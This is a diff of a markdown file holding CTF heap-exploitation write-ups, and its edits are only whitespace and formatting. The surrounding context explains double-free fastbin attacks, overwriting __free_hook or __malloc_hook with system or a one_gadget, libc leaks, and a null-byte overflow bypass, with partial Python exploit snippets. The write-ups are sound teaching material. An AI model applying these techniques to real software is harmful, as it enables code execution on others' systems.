@@ -171,7 +171,7 @@ This probably means that `size` actually is not a `long` (8 bytes), but it is an
 void write_entry(void)
 
 {
-  int i; 
+  int i;
   printf("Index: ");
   i = read_integer();
   if ((i < 0) || (99 < i)) {
@@ -227,7 +227,7 @@ Same as the other function: there is no check in place. We can free a chunk more
 
 2. vulnerability: `free_entry`, we can free more than once chunks -> fastbin attack to make `malloc` allocate something in memory: the address of `system()` into either `__free_hook` or `__malloc_hook`.
 
-   More specifically when overwriting `__free_hook` we overwrite it with `system` and we pass `/bin/sh` to it. Instead when we overwrite `__malloc_hook`  we use `one_gadget` since the parameter of the `malloc` is a number, not a string.
+   More specifically when overwriting `__free_hook` we overwrite it with `system` and we pass `/bin/sh` to it. Instead when we overwrite `__malloc_hook` we use `one_gadget` since the parameter of the `malloc` is a number, not a string.
 
 ### The exploit in practice
 
@@ -314,14 +314,14 @@ print("[!] libc_leak: %#x" % libc_leak)
 print("[!] libc_base: %#x" % libc_base)
 ```
 
-**Part 1: leaking libc address** 
+**Part 1: leaking libc address**
 
 We need to leak `libc`, how do we do it? We allocate a small bin and **free it**, since after the free it will contain an address to a location which is is located into libc:
 
 ```python
 chunk_a = alloc(0x200)
 free(chunk_a)
-print(chunk_a, read(chunk_a))    
+print(chunk_a, read(chunk_a))
 ```
 
 This happens because when we have only one chunk it will contain a random libc address, from which we can compute the address of the base of the libc. To find the offset we will use `vmmap` in gdb.
@@ -396,7 +396,7 @@ free_chunk(chunk_c)
 chunk_c = alloc(size)
 write_chunk(chunk_c, p64(malloc_hook-0x23))
 
-alloc(size)             
+alloc(size)
 alloc(size)
 
 # with the following call to alloc()
@@ -437,10 +437,10 @@ malloc n, free p, show p [n], write p [n]
 
 Basically it can:
 
-* Allocate a chunk of size `n` and return its address
-* Free a chunk, given its address `p`
-* Show the content of a chunk given `p`. By default it shows the first 8 bytes of data, unless a size `n` is specified.
-* Write some data into a chunk, given `p`.
+- Allocate a chunk of size `n` and return its address
+- Free a chunk, given its address `p`
+- Show the content of a chunk given `p`. By default it shows the first 8 bytes of data, unless a size `n` is specified.
+- Write some data into a chunk, given `p`.
 
 There are some obvious vulnerabilities: for e.g. the chunk freeing is achieved without checking if the chunk is allocated or not, which could be used as an attack surface to carry a fast bin attack.
 
@@ -657,7 +657,7 @@ char * get_string(void) {
 }
 ```
 
-To bypass the null byte overflow mitigation we need to exploit the `rename_pokemon` function, and fill a buffer which should contain a pokemon name with fake previous sizes. This is the function that calls `get_string`:
+To bypass the null byte overflow mitigation we need to exploit the `rename_pokemon` function, and fill a buffer which should contain a pokemon name with fake previous sizes. This is the function that calls `get_string`:
 
 ```c
 void rename_pkm(void) {
@@ -979,6 +979,7 @@ p = {
     'moves' : (p64(0) + p64(target))*10
 }
 ```
+
 With `binsh` written in the chunk header, since by checking with gdb I saw that the argument passed to the address called during the `fight_pkm` was in the beginning of its chunk. Problem is, first of all we need to leak an address belonging to `libc`... This can be done via some symbols already resolved and present in the `GOT`, since the binary is not `PIE`. If we exploit the overlapping chunks to put an adress of the `GOT` into one of the overlapped pokemon chunk, and in particular into the name field of the pkm struct, we can print a `libc` runtime address. Code for this:
 
 ```python
@@ -991,7 +992,7 @@ rename_handler(r, pkFIN, len(formatter(p)), formatter(p))
 leak = info_handler(r, pkB2)
 libcleak = hex(unpack(leak[0], 'all', endian='little', sign=False))
 print(colors['red'] + 'libc leak: {}'.format(hex(int(libcleak, 16))))
-printer(colors['cyan'] + 
+printer(colors['cyan'] +
 ```
 
 So we have a two stage exploit:
